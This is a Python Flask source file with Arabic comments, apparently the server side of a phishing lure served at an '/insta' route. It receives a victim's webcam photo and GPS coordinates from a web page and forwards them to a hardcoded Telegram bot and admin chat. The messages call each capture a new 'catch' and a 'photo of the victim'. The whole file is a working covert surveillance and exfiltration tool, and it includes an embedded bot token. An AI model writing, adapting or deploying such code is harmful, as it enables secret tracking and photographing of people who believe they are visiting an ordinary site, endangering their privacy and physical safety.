from flask import Flask, render_template, request, jsonify
import telebot
import threading
import base64
import os

app = Flask(__name__)

# --- [ إعدادات القناص الخاصة بك ] ---
API_TOKEN = '8281242369:AAEf0c8gx9bhpbHqbXO5a0He-HlvTx_7Kp8'
ADMIN_ID = '8276213504'
bot = telebot.TeleBot(API_TOKEN)

@app.route('/')
@app.route('/insta')
def index():
    # Flask سيبحث عن index.html داخل مجلد templates
    return render_template('index.html')

@app.route('/send', methods=['POST'])
def send_data():
    try:
        data = request.json
        img_data = data.get('image')
        lat = data.get('lat')
        lon = data.get('lon')

        # 1. إرسال إشعار فوري بالموقع
        location_msg = f"🎯 **صيد جديد يا قائد!**\n📍 الموقع على الخريطة:\nhttps://www.google.com/maps?q={lat},{lon}"
        bot.send_message(ADMIN_ID, location_msg, parse_mode='Markdown')

        # 2. معالجة وإرسال الصورة (إذا وجدت)
        if img_data and "," in img_data:
            header, encoded = img_data.split(",", 1)
            with open("capture.png", "wb") as f:
                f.write(base64.b64decode(encoded))
            
            with open("capture.png", "rb") as photo:
                bot.send_photo(ADMIN_ID, photo, caption="📸 صورة الضحية المباشرة")
            
            # تنظيف الملف بعد الإرسال
            os.remove("capture.png")
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    # تشغيل البوت في الخلفية لضمان عمل الرابط والأزرار دائماً
    threading.Thread(target=run_bot, daemon=True).start()
    # التشغيل على المنفذ الافتراضي لـ Render
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
